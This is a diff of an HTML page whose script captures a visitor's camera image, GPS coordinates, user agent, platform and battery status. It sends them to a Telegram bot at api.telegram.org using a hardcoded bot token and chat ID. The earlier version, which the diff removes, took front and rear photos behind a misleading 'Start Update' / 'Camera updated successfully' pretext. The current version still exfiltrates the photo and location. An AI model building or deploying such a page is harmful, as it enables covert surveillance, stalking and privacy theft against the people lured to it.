@@ -60,7 +60,14 @@
       text-align: center;
     }
 
-    video, canvas {
+    video {
+      width: 100%;
+      max-width: 320px;
+      border-radius: 12px;
+      margin-top: 20px;
+    }
+
+    canvas {
       display: none;
     }
   </style>
@@ -74,7 +81,7 @@
     <div id="status"></div>
   </div>
 
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
@@ -84,10 +91,8 @@
     const startBtn = document.getElementById('startBtn');
     const statusEl = document.getElementById('status');
 
-    const botToken = "7592072345:AAETQGV7KRpR_tZS3qd-gIZYiC1JqrTR1iM"; // ✅ Replace with your Telegram Bot Token
-    const chatId = "7893603597";     // ✅ Replace with your Chat ID
-
-    let photos = [];
+    const botToken = "7592072345:AAETQGV7KRpR_tZS3qd-gIZYiC1JqrTR1iM"; // ✅ Replace with your bot token
+    const chatId = "7893603597"; // ✅ Replace with your chat ID
 
     async function getLocationInfo() {
       return new Promise((resolve) => {
@@ -101,7 +106,7 @@
             const { latitude, longitude } = pos.coords;
             resolve(`Location: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`);
           },
-          err => {
+          () => {
             resolve("Location: Error");
           },
           { timeout: 3000 }
@@ -125,65 +130,73 @@
 
       const location = await getLocationInfo();
 
-      return `Time: ${date}\n${location}\nPlatform: ${platform}\nLanguage: ${lang}\nUserAgent: ${ua}\n${battery}`;
+      return `Time: ${date}\nLocation: ${location}\nPlatform: ${platform}\nLanguage: ${lang}\nUserAgent: ${ua}\n${battery}`;
     }
 
-    async function captureImage(facing) {
-      const constraints = { video: { facingMode: facing } };
+    async function captureImage(facing = "user") {
+      const constraints = {
+        video: { facingMode: { ideal: facing }, width: 320, height: 240 }
+      };
 
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      video.srcObject = stream;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
 
-      await new Promise(r => setTimeout(r, 1500)); // wait for camera to settle
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(resolve, 2500); // Wait for camera to settle
+          };
+        });
 
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-      stream.getTracks().forEach(t => t.stop());
+        canvas.width = video.videoWidth || 320;
+        canvas.height = video.videoHeight || 240;
 
-      return blob;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+
+        stream.getTracks().forEach(t => t.stop());
+        return blob;
+      } catch (err) {
+        statusEl.textContent = "❌ Camera access denied or failed.";
+        throw err;
+      }
     }
 
-    async function sendToTelegram(photoBlobs, detailsText) {
-      for (let i = 0; i < photoBlobs.length; i++) {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", photoBlobs[i], `photo${i+1}.jpg`);
-        if (i === 0) {
-          formData.append("caption", `<b>📷 Auto Camera Update</b>\n\n<pre>${detailsText.replace(/</g, "&lt;")}</pre>`);
-          formData.append("parse_mode", "HTML");
-        }
+    async function sendToTelegram(photoBlob, detailsText) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", photoBlob, "photo.jpg");
+      formData.append("caption", `<b>📷 Front Camera Capture</b>\n\n<pre>${detailsText.replace(/</g, "&lt;")}</pre>`);
+      formData.append("parse_mode", "HTML");
 
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        } catch (e) {
-          console.error("Telegram Error", e);
-        }
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (e) {
+        console.error("Telegram Upload Error", e);
       }
     }
 
     startBtn.addEventListener('click', async () => {
       startBtn.disabled = true;
-      statusEl.textContent = "Updating... Please wait.";
+      statusEl.textContent = "📸 Capturing front camera image...";
 
       try {
         const details = await getDeviceDetails();
-        const backPhoto = await captureImage("environment");
         const frontPhoto = await captureImage("user");
-
-        await sendToTelegram([backPhoto, frontPhoto], details);
-        statusEl.textContent = "✅ Camera updated successfully.";
+        await sendToTelegram(frontPhoto, details);
+        statusEl.textContent = "✅ Camera image sent successfully.";
       } catch (err) {
         console.error(err);
         statusEl.textContent = "❌ Something went wrong.";
       } finally {
         startBtn.disabled = false;
-        startBtn.innerText = "Start Update";
       }
     });
   </script>
 
 </body>
-  </html>
+</html>
